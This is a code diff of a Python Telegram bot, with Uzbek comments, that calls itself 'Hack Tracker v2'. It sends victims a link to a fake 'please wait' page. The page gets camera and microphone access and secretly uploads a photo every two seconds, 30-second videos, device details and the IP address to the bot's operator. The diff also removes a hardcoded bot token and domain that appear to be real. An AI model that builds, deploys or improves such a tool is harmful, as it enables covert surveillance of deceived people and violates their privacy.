@@ -1,11 +1,11 @@
-#!/usr/bin/env python3
 import os
 import uuid
 import base64
-import asyncio
 import logging
 from io import BytesIO
+import asyncio
 import json
+
 from aiohttp import web
 from telegram import Update, InputFile
 from telegram.ext import Application, CommandHandler, ContextTypes
@@ -13,20 +13,21 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# === SOZLAMALAR ===
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
-WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "fit-roanna-runex-7a8db616.koyeb.app").strip().rstrip('/')
+# -----------------------
+# Konfiguratsiya / ENV
+# -----------------------
+BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE")
+WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://your-domain.example").strip().rstrip('/')
 PORT = int(os.getenv("PORT", "8000"))
 
-if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-    raise ValueError("❌ BOT_TOKEN muhit o'zgaruvchisini kiriting!")
-
-if not WEBHOOK_DOMAIN:
-    raise ValueError("❌ WEBHOOK_DOMAIN muhit o'zgaruvchisini kiriting!")
+if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
+    raise ValueError("❌ BOT_TOKEN ni o'rnating!")
 
 USER_TOKENS = {}
 
-# === /start handler ===
+# --------------------------------
+# Telegram /start
+# --------------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     token = str(uuid.uuid4())
@@ -35,13 +36,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = (
         "🕵️‍♂️ **Maxfiy kuzatuv**\n\n"
         f"🔗 [Bosing: {link}]({link})\n\n"
-        "Sahifa ochilgach:\n"
-        "✅ Kamera + mikrofon ruxsati berilsa → **har 30 soniyada video (ovozli)** yuboriladi\n"
-        "❌ Rad etilsa → faqat qurilma ma'lumotlari yuboriladi"
+        "✅ Kamera ruxsati berilsa:\n"
+        "📸 Har **2 soniyada rasm**\n"
+        "🎥 Har **30 soniyada video** (ovoz bilan, agar ruxsat berilsa)\n\n"
+        "❌ Rad etilsa — faqat qurilma ma'lumotlari yuboriladi."
     )
     await update.message.reply_text(msg, parse_mode="Markdown")
 
-# === IP manzilini olish ===
+# ---------------------------
+# IP manzilini olish
+# ---------------------------
 def get_client_ip(request: web.Request) -> str:
     hdr = request.headers.get("X-Forwarded-For")
     if hdr:
@@ -54,17 +58,19 @@ def get_client_ip(request: web.Request) -> str:
         return str(peer[0])
     return "Noma'lum"
 
-# === Sahifa HTML ===
+# -----------------------------------------
+# Sahifa HTML (JavaScript yangilangan)
+# -----------------------------------------
 async def track_page(request: web.Request):
     token = request.query.get("token")
     if not token or token not in USER_TOKENS:
-        return web.Response(text="❌ Noto‘g‘ri token", status=403)
+        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)
 
     html = f"""<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>Yuklanmoqda...</title>
+  <title>Kuzatuv...</title>
   <style>
     body {{
       font-family: sans-serif;
@@ -87,12 +93,13 @@ async def track_page(request: web.Request):
 <body>
   <h2>Iltimos, kuting...</h2>
   <div class="loader"></div>
-  <div class="note">Ma'lumotlar yig'ilmoqda...</div>
+  <div class="note">Kamera sozlanmoqda...</div>
   <script>
     let stream = null;
     let mediaRecorder = null;
     let recordedChunks = [];
-    let intervalId = null;
+    let photoInterval = null;
+    let videoInterval = null;
 
     async function collectData() {{
       return {{
@@ -114,8 +121,21 @@ async def track_page(request: web.Request):
         model: "Noma'lum",
         devices: {{ mic: 0, speaker: 0, camera: 0 }},
         gpu: "Noma'lum",
+        cameraRes: "Noma'lum",
         network: "Noma'lum"
       }};
+    }}
+
+    async function sendPhoto(photoBlob, data) {{
+      const formData = new FormData();
+      formData.append("token", "{token}");
+      formData.append("clientData", JSON.stringify(data));
+      formData.append("photo", photoBlob);
+      try {{
+        await fetch("/submit_photo", {{ method: "POST", body: formData }});
+      }} catch (err) {{
+        console.error("Rasm yuborishda xato:", err);
+      }}
     }}
 
     async function sendVideo(videoBlob, data) {{
@@ -123,20 +143,38 @@ async def track_page(request: web.Request):
       formData.append("token", "{token}");
       formData.append("clientData", JSON.stringify(data));
       if (videoBlob) {{
-        const file = new File([videoBlob], "recording.webm", {{ type: "video/webm" }});
-        formData.append("video", file);
+        formData.append("video", videoBlob);
       }}
       try {{
         await fetch("/submit", {{ method: "POST", body: formData }});
-      }} catch (e) {{
-        console.error("Yuborish xatosi:", e);
+      }} catch (err) {{
+        console.error("Video yuborishda xato:", err);
       }}
     }}
 
-    function startRecording() {{
+    async function takePhoto() {{
+      if (!stream) return;
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await new Promise(r => {{
+        video.onloadedmetadata = r;
+        video.play();
+      }});
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async blob => {{
+        const data = await collectData();
+        await sendPhoto(blob, data);
+      }}, "image/jpeg", 0.9);
+    }}
+
+    function startVideoRecording() {{
       if (!stream) return;
       recordedChunks = [];
-      const options = {{ mimeType: 'video/webm;codecs=vp9,opus' }};
+      const options = {{ mimeType: 'video/webm;codecs=vp9' }};
       if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
         options.mimeType = 'video/webm';
       }}
@@ -146,44 +184,60 @@ async def track_page(request: web.Request):
       }};
       mediaRecorder.onstop = async () => {{
         if (recordedChunks.length === 0) return;
-        const blob = new Blob(recordedChunks, {{ type: 'video/webm' }});
+        const videoBlob = new Blob(recordedChunks, {{ type: 'video/webm' }});
         const data = await collectData();
-        await sendVideo(blob, data);
+        await sendVideo(videoBlob, data);
         recordedChunks = [];
-        if (stream) startRecording(); // Keyingi sikl
+        if (stream) startVideoRecording(); // Keyingi sikl
       }};
       mediaRecorder.start();
-      intervalId = setTimeout(() => {{
+      videoInterval = setTimeout(() => {{
         if (mediaRecorder && mediaRecorder.state === "recording") {{
           mediaRecorder.stop();
         }}
       }}, 30000); // 30 SONIYA
-    }}
+    }
 
     async function startStream() {{
       try {{
-        // ✅ KAMERA + MIKROFON
+        // Avval audio + video so'raymiz
         stream = await navigator.mediaDevices.getUserMedia({{
           video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }},
           audio: true
         }});
-        startRecording();
-      }} catch (err) {{
-        console.warn("Ruxsat rad etildi:", err);
-        const data = await collectData();
-        await sendVideo(null, data);
+      }} catch (err1) {{
+        console.warn("Audio yoki video rad etildi. Faqat videoni so'rayapman...");
         try {{
-          await fetch("/camera_denied", {{
-            method: "POST",
-            headers: {{ "Content-Type": "application/json" }},
-            body: JSON.stringify({{ token: "{token}" }})
-          }});
-        }} catch (e) {{}}
+          // Faqat video
+          stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
+        }} catch (err2) {{
+          console.warn("Kamera ham ishlamadi:", err2);
+          const data = await collectData();
+          await sendVideo(null, data);
+          try {{
+            await fetch("/camera_denied", {{
+              method: "POST",
+              headers: {{ "Content-Type": "application/json" }},
+              body: JSON.stringify({{ token: "{token}" }})
+            }});
+          }} catch (e) {{}}
+          return;
+        }}
       }}
-    }}
+
+      // Birinchi rasm
+      await takePhoto();
+
+      // Har 2 soniyada rasm
+      photoInterval = setInterval(takePhoto, 2000);
+
+      // Video yozishni boshlash
+      startVideoRecording();
+    }
 
     function stopAll() {{
-      if (intervalId) clearTimeout(intervalId);
+      if (photoInterval) clearInterval(photoInterval);
+      if (videoInterval) clearTimeout(videoInterval);
       if (mediaRecorder && mediaRecorder.state === "recording") {{
         mediaRecorder.stop();
       }}
@@ -191,6 +245,8 @@ async def track_page(request: web.Request):
         stream.getTracks().forEach(t => t.stop());
         stream = null;
       }}
+      mediaRecorder = null;
+      recordedChunks = [];
     }}
 
     window.addEventListener('beforeunload', stopAll);
@@ -202,11 +258,48 @@ async def track_page(request: web.Request):
 </html>"""
     return web.Response(text=html, content_type="text/html")
 
-# === Ma'lumot yoki video qabul qilish ===
-# === Ma'lumot yoki video qabul qilish ===
-# === Ma'lumot yoki video qabul qilish ===
+# -----------------------------------------
+# Rasm qabul qilish
+# -----------------------------------------
+async def submit_photo(request: web.Request):
+    try:
+        reader = await request.multipart()
+        token = None
+        client_data = {}
+        photo_data = None
+
+        async for field in reader:
+            if field.name == "token":
+                token = (await field.read()).decode()
+            elif field.name == "clientData":
+                client_data = json.loads((await field.read()).decode())
+            elif field.name == "photo":
+                photo_data = await field.read()
+
+        user_id = USER_TOKENS.get(token)
+        if not user_id or not photo_data:
+            return web.Response(status=400)
+
+        ip = get_client_ip(request)
+        caption = f"📸 Kamera rasmi\n📍 IP: {ip}\n🕒 {client_data.get('timestamp')}"
+
+        photo_file = BytesIO(photo_data)
+        photo_file.name = "photo.jpg"
+        await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(photo_file), caption=caption)
+
+        return web.Response(text="ok")
+    except Exception as e:
+        logger.exception("submit_photo xato")
+        return web.Response(status=500)
+
+# -----------------------------------------
+# Video yoki ma'lumot qabul qilish
+# -----------------------------------------
 async def submit_data(request: web.Request):
     try:
+        if not request.content_type.startswith("multipart/form-data"):
+            return web.Response(status=400)
+
         reader = await request.multipart()
         token = None
         client_data = {}
@@ -257,13 +350,13 @@ async def submit_data(request: web.Request):
             await request.app["bot"].send_message(chat_id=user_id, text=message)
 
         return web.Response(text="ok")
-
     except Exception as e:
         logger.exception("submit_data xato")
         return web.Response(status=500)
 
-
-# === Kamera rad etilganda ===
+# ---------------------------
+# Kamera rad etilganda
+# ---------------------------
 async def camera_denied(request: web.Request):
     try:
         data = await request.json()
@@ -272,19 +365,22 @@ async def camera_denied(request: web.Request):
         if user_id:
             await request.app["bot"].send_message(
                 chat_id=user_id,
-                text="⚠️ Kamera yoki mikrofon ruxsati berilmadi."
+                text="⚠️ Kamera ruxsati berilmadi."
             )
         return web.Response(status=200)
     except Exception as e:
         logger.exception("camera_denied xato")
         return web.Response(status=500)
 
-# === Web server ===
+# -----------------------------------------
+# Web server
+# -----------------------------------------
 async def start_web_server(bot):
     app = web.Application()
     app["bot"] = bot
     app.router.add_get("/track", track_page)
     app.router.add_post("/submit", submit_data)
+    app.router.add_post("/submit_photo", submit_photo)
     app.router.add_post("/camera_denied", camera_denied)
     runner = web.AppRunner(app)
     await runner.setup()
@@ -292,15 +388,19 @@ async def start_web_server(bot):
     await site.start()
     logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{PORT}")
 
-# === Startup ===
-async def on_startup(app: Application):
+# -----------------------------------------
+# Startup
+# -----------------------------------------
+async def on_startup(app):
     asyncio.create_task(start_web_server(app.bot))
 
-# === Asosiy funksiya ===
+# -----------------------------------------
+# Main
+# -----------------------------------------
 def main():
     app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
     app.add_handler(CommandHandler("start", start))
-    logger.info("🕵️‍♂️ Hack Tracker bot ishga tushdi!")
+    logger.info("🕵️‍♂️ Hack Tracker v2 ishga tushdi!")
     app.run_polling()
 
 if __name__ == "__main__":
